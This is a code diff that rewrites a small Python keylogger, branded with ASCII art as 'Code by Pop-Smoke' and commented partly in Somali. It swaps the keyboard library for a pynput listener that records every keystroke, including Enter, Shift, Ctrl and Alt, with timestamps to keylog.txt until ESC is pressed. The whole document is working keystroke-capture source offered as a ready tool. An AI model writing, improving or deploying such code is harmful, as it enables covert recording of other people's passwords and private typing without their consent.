@@ -1,37 +1,66 @@
+import logging
 import os
-import keyboard
+from pynput import keyboard
+from colorama import Fore, Back, Style, init
 
-# Nadiifi Terminal-ka
-def clear_terminal():
-    os.system('clear')
+# Initialize colorama
+init(autoreset=True)
 
-# ASCII Qurux Leh
-def show_banner():
-    banner = """
-       ██████╗ ███████╗███████╗ █████╗ ███╗   ██╗
-      ██╔═══██╗██╔════╝██╔════╝██╔══██╗████╗  ██║
-      ██║   ██║███████╗█████╗  ███████║██╔██╗ ██║
-      ██║   ██║╚════██║██╔══╝  ██╔══██║██║╚██╗██║
-      ╚██████╔╝███████║███████╗██║  ██║██║ ╚████║
-       ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝
-                 SHAYDAAN LOGGER
-        [!!] BEWARE - CODE BY POP-SMOKE [!!]
-    """
-    print(f"\033[31m{banner}\033[0m")  # Red color for the banner
+# Set up logging
+logging.basicConfig(filename='keylog.txt', level=logging.INFO, format='%(asctime)s: %(message)s')
 
-# Keylogger Function
+# ASCII Art for branding
+ascii_art = '''
+  _____           _          _____  _      _____                    
+ |  __ \         | |        / ____|| |    / ____|                   
+ | |__) |_ _ ___| |_ ___  | (___  | |__ | |__ ___  _ __   __ _ ___  
+ |  ___/ _` / __| __/ _ \  \___ \ | '_ \|  __/ _ \| '_ \ / _` / __| 
+ | |  | (_| \__ \ ||  __/  ____) || | | | | | (_) | | | | (_| \__ \ 
+ |_|   \__,_|___/\__\___| |_____/ |_| |_|\___\___/|_| |_|\__,_|___/ 
+                                                                     
+                                                                     
+                        Code by Pop-Smoke                         
+'''
+
+# Function to print ASCII Art and clear shell
+def print_banner():
+    os.system('clear')  # Nadiifi screen-ka marka hore
+    print(Fore.GREEN + ascii_art)  # Daabac ASCII art oo leh midab
+    print(Fore.YELLOW + Style.BRIGHT + "[INFO] Keylogger is running... Press 'ESC' to stop.")  # Midab iyo qoraal iftiimaya
+
+# Define on_press event
+def on_press(key):
+    try:
+        logging.info(f'Key pressed: {key.char}')
+    except AttributeError:
+        if key == keyboard.Key.space:
+            logging.info(' Space ')
+        elif key == keyboard.Key.enter:
+            logging.info(' Enter ')
+        elif key == keyboard.Key.tab:
+            logging.info(' Tab ')
+        elif key == keyboard.Key.backspace:
+            logging.info(' Backspace ')
+        elif key == keyboard.Key.shift:
+            logging.info(' Shift ')
+        elif key == keyboard.Key.ctrl:
+            logging.info(' Ctrl ')
+        elif key == keyboard.Key.alt:
+            logging.info(' Alt ')
+
+# Define on_release event
+def on_release(key):
+    if key == keyboard.Key.esc:
+        # Stop listener
+        print(Fore.RED + "[INFO] Keylogger stopped.")  # Daabac farriinta joojinta oo leh midab casaan
+        return False
+
+# Start keylogger
 def start_keylogger():
-    print("\033[33m[INFO]\033[0m Keylogger is running... Press 'ESC' to stop.")
-    with open("keylog.txt", "w") as log_file:
-        while True:
-            event = keyboard.read_event(suppress=True)  # Qabashada furayaasha
-            if event.name == 'esc':  # Haddii ESC la riixo, jooji
-                print("\033[32m[INFO]\033[0m Exiting keylogger...")
-                break
-            log_file.write(f"{event.name}\n")  # Ku qor keylog.txt
+    print_banner()  # Display the ASCII banner
+    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
 
-# Main Program
+# Run the keylogger
 if __name__ == "__main__":
-    clear_terminal()
-    show_banner()
     start_keylogger()
